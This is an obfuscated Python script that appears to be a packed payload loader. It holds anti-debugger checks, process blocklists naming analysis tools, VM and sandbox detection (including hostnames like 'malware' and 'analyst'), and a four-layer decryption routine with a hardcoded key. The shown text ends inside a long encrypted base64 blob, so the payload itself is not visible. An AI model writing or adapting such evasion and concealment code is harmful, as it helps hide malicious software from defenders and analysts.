#!/usr/bin/env python3
import sys, os, time, threading, gc, platform, socket, random, secrets, base64, hashlib
from datetime import datetime
from Crypto.Cipher import AES, ChaCha20, Salsa20
from Crypto.Protocol.KDF import scrypt

ol0l1Oo0ll0olI0olIl0 = bytes.fromhex('58bc7dacf828ae0f8af38567dd7ed579dad43bad1df76d1789609b718a39d7a8a5411bddc7d5956311de32f07cca82d8b0fa532f197e114bf271ab47624a6612')
OoO0lloO0llI0ooo0_OI = 0
IO0oIIl0I0ol_lI0ooOI = [secrets.randbits(64) for _ in range(12)]
oO0OlI0oOoO0lOl1OoIo = {'last_check': time.time(), 'violations': 0, 'session_start': time.time()}
OOIl0llI0oIOo0OlII0O = [threading.Event() for _ in range(3)]

def O0o_Il0OIl0OIl0OIl0O():
    global IO0oIIl0I0ol_lI0ooOI, oO0OlI0oOoO0lOl1OoIo
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        IO0oIIl0I0ol_lI0ooOI[0] ^= 0xDEADBEEF
        raise RuntimeError("Debugger detected")
    try:
        frame = sys._getframe()
        if frame.f_trace is not None or frame.f_back.f_trace is not None:
            raise RuntimeError("Debugger frame detected")
    except:
        pass
    measurements = []
    for _ in range(5):
        start = time.perf_counter_ns()
        dummy = sum(i * random.randint(1, 100) for i in range(3000))
        elapsed = time.perf_counter_ns() - start
        measurements.append(elapsed)
    avg_time = sum(measurements) / len(measurements)
    if avg_time > 150_000_000 or max(measurements) > 300_000_000:
        raise RuntimeError("Timing anomaly detected")
    obj_count = len(gc.get_objects())
    if obj_count > 500000 or obj_count < 500:
        raise RuntimeError("GC anomaly detected")
    suspicious_env = ['PYTHONDEBUG', 'PYTHONINSPECT', 'PYTHONHOME', '_DEBUG']
    if any(var in os.environ for var in suspicious_env):
        raise RuntimeError("Suspicious environment detected")
    try:
        import psutil
        current_proc = psutil.Process()
        if current_proc.memory_info().rss > 2 * 1024 * 1024 * 1024:
            raise RuntimeError("Memory limit exceeded")
        parent = current_proc.parent()
        if parent and any(debugger in parent.name().lower() 
                         for debugger in ['ida', 'olly', 'x64dbg', 'ghidra', 'radare', 'gdb']):
            raise RuntimeError("Debugger process detected")
        dangerous_processes = [
            'ida', 'ida64', 'ollydbg', 'x32dbg', 'x64dbg', 'windbg', 'ghidra',
            'radare2', 'r2', 'gdb', 'lldb', 'wireshark', 'processhacker',
            'cheatengine', 'artmoney', 'debugview', 'procmon', 'regmon',
            'filemon', 'apimonitor', 'detours', 'apihook', 'hookapi'
        ]
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            if any(tool in proc_name for tool in dangerous_processes):
                raise RuntimeError("Security tool detected")
    except ImportError:
        pass
    except:
        pass
    oO0OlI0oOoO0lOl1OoIo['last_check'] = time.time()
    IO0oIIl0I0ol_lI0ooOI[random.randint(0, len(IO0oIIl0I0ol_lI0ooOI)-1)] ^= random.randint(1, 0xFFFF)

def o_Il0OI1lOO_l1OoO_0I():
    vm_signatures = [
        'vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels',
        'hyperv', 'hyper-v', 'kvm', 'bochs', 'wine', 'docker', 
        'kubernetes', 'sandboxie', 'cuckoo', 'anubis', 'joebox',
        'threatexpert', 'cwsandbox', 'comodo', 'sunbelt', 'gfi'
    ]
    system_info = (platform.system() + platform.machine() + 
                  platform.processor() + platform.platform()).lower()
    if any(sig in system_info for sig in vm_signatures):
        raise RuntimeError("VM environment detected")
    try:
        hostname = socket.gethostname().lower()
        suspicious_hostnames = vm_signatures + [
            'sandbox', 'malware', 'analysis', 'test', 'victim', 'sample',
            'honeypot', 'research', 'analyst', 'reverse', 'debug'
        ]
        if any(name in hostname for name in suspicious_hostnames):
            raise RuntimeError("Suspicious hostname detected")
    except:
        pass
    try:
        start = time.perf_counter()
        for _ in range(200000):
            _ = random.random() ** 0.5
        cpu_time = time.perf_counter() - start
        if cpu_time > 1.0:
            raise RuntimeError("CPU timing anomaly detected")
        start = time.perf_counter()
        data = [random.randint(0, 1000000) for _ in range(50000)]
        data.sort()
        memory_time = time.perf_counter() - start
        if memory_time > 0.5:
            raise RuntimeError("Memory timing anomaly detected")
    except:
        pass
    vm_files = [
        '/proc/vz', '/proc/bc', '/.dockerenv', '/.dockerinit',
        '/usr/bin/VBoxControl', '/usr/bin/VBoxService',
        'C:\\windows\\system32\\drivers\\VBoxMouse.sys',
        'C:\\windows\\system32\\drivers\\vmhgfs.sys'
    ]
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            raise RuntimeError("VM files detected")

def llI0oI1lOlol1Oo_oO0l(purpose: str, length: int) -> bytes:
    global ol0l1Oo0ll0olI0olIl0
    salt = hashlib.sha256(purpose.encode()).digest()
    key_material = ol0l1Oo0ll0olI0olIl0
    return scrypt(key_material, salt, length, N=2**16, r=8, p=1)

def lo_oO0l0l0oOl0oOOIl0(data: bytes) -> bytes:
    try:
        aes_key = llI0oI1lOlol1Oo_oO0l("AES_LAYER", 32)
        chacha_key = llI0oI1lOlol1Oo_oO0l("CHACHA_LAYER", 32)
        salsa_key = llI0oI1lOlol1Oo_oO0l("SALSA_LAYER", 32)
        xor_key = llI0oI1lOlol1Oo_oO0l("XOR_LAYER", 256)
        salsa_nonce = data[:8]
        encrypted_data = data[8:]
        xor_decrypted = bytes(a ^ b for a, b in zip(encrypted_data,
                            (xor_key * (len(encrypted_data) // len(xor_key) + 1))[:len(encrypted_data)]))
        salsa_cipher = Salsa20.new(key=salsa_key, nonce=salsa_nonce)
        chacha_data = salsa_cipher.decrypt(xor_decrypted)
        chacha_nonce = chacha_data[:12]
        chacha_encrypted = chacha_data[12:]
        chacha_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
        aes_data = chacha_cipher.decrypt(chacha_encrypted)
        aes_nonce = aes_data[:16]
        aes_tag = aes_data[16:32]
        aes_encrypted = aes_data[32:]
        aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=aes_nonce)
        return aes_cipher.decrypt_and_verify(aes_encrypted, aes_tag)
    except Exception:
        raise RuntimeError("Decryption failed")

def IIl0Ol0oOoI1lOO_00l0():
    global OoO0lloO0llI0ooo0_OI, IO0oIIl0I0ol_lI0ooOI, oO0OlI0oOoO0lOl1OoIo
    expected_violations = oO0OlI0oOoO0lOl1OoIo.get('violations', 0)
    current_violations = sum(1 for canary in IO0oIIl0I0ol_lI0ooOI if canary & 0xFFFF == 0)
    if abs(current_violations - expected_violations) > 5:
        raise RuntimeError("Integrity check failed")
    pass
    OoO0lloO0llI0ooo0_OI += 1
    pass
    session_duration = time.time() - oO0OlI0oOoO0lOl1OoIo.get('session_start', time.time())
    if session_duration > 172800:
        raise RuntimeError("Session duration exceeded")


def OOO0oIIl1Oo_O0II1lOO():
    while True:
        sleep_time = random.uniform(1.5, 4.0)
        time.sleep(sleep_time)
        try:
            O0o_Il0OIl0OIl0OIl0O()
            o_Il0OI1lOO_l1OoO_0I()
            IIl0Ol0oOoI1lOO_00l0()
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(IO0oIIl0I0ol_lI0ooOI) - 1)
                IO0oIIl0I0ol_lI0ooOI[idx] ^= random.randint(1, 0xFFFFFFFF)
        except Exception as e:
            print(f"Security violation: {str(e)}")
            sys.exit(1)

def lOOIl0OI1lOoIl0O0lI0():
    try:
        O0o_Il0OIl0OIl0OIl0O()
        o_Il0OI1lOO_l1OoO_0I()
        IIl0Ol0oOoI1lOO_00l0()
        OOIl0llI0oIOo0OlII0O[0].set()
        ol1OoI0olO0oII0olOO_ = base64.b64decode('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